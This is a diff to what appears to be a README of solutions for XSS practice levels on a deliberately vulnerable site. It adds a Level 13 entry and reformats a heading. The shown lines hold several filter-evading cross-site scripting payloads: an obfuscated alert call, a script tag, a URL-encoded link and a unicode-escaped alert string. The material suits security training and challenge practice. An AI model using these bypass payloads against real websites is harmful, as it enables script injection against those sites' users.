@@ -78,7 +78,7 @@ this[8680439..toString(30)](document.domain)
 ```
 #<script>alert(document.domain)</script>
 ```
-🧨 Level 12 — External Payload Injection
+- 🧨 Level 12 — External Payload Injection
 
 📎 Go to: http://untrusted.sudo.co.il/iframe.php?p=
 
@@ -89,6 +89,12 @@ Paste the following encoded payload formate unicode:
 🔗 Final link:
 
 http://untrusted.sudo.co.il/iframe.php?p=%27%3Bal%5Cu0065rt%28m%29%3B%2F%2F
+
+- 🧨 Level 13 — External Payload Injection
+
+```
+';al\u0065rt`1`;//
+```
 
 ---
 ## 👨‍💻 Author
